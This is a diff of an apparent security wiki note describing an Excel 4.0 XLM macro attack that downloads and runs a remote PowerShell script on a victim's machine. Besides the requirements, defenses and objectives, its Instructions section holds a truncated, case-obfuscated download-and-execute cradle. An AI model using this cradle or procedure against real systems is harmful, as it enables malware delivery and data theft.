@@ -29,6 +29,8 @@ This procedure involves using the XLM macro language in Excel 4.0 to execute a P
 
 This procedure involves using the XLM macro language in Excel 4.0 to execute a PowerShell script downloaded from a remote server. The XLM macro is created to download the PowerShell script from a remote server and then execute it on the victim's machine. This technique allows an attacker to bypass traditional security controls such as email filters and antivirus software. The PowerShell script can be used to perform a variety of actions on the victim's machine, such as downloading and executing additional malware or exfiltrating sensitive data. This technique can be particularly effective against organizations that rely heavily on Excel for their day-to-day operations.
 
+ 
+
 ## Requirements
 
 1. Access to a remote server to host the PowerShell script
@@ -36,6 +38,8 @@ This procedure involves using the XLM macro language in Excel 4.0 to execute a P
 1. Victim must have Excel 4.0 installed
 
 1. Victim must enable macros in the Excel document
+
+ 
 
 ## Defense
 
@@ -45,6 +49,8 @@ This procedure involves using the XLM macro language in Excel 4.0 to execute a P
 
 1. Use antivirus software that can detect and block malicious Excel documents
 
+ 
+
 ## Objectives
 
 1. Download and execute a PowerShell script on a victim's machine
@@ -53,11 +59,19 @@ This procedure involves using the XLM macro language in Excel 4.0 to execute a P
 
 1. Perform a variety of actions on the victim's machine, such as downloading and executing additional malware or exfiltrating sensitive data
 
+ 
+
 # Instructions
 
 1. This command downloads a PowerShell script from a remote server and executes it on the local machine using the `EXEC` macro. The PowerShell script is downloaded using the `DownloadString` method of the `System.Net.WebClient` class. The URL of the script is provided as an argument to the `DownloadString` method.
 
+ 
+
+
+
 **Code**: [[=EXEC("poWerShell IEX(nEw-oBject nEt.webclient).Do]]
+
+
 
 > The `EXEC` macro is used to execute the downloaded PowerShell script. The `halt()` command is used to stop the execution of the current macro. This command is useful for downloading and executing scripts from a remote server, which can be useful for automating tasks or performing reconnaissance on a target network.
 
@@ -77,3 +91,5 @@ This procedure involves using the XLM macro language in Excel 4.0 to execute a P
 
 - [[Office - Attacks]]
 - [[XLM Excel 4.0 - EXEC]]
+
+
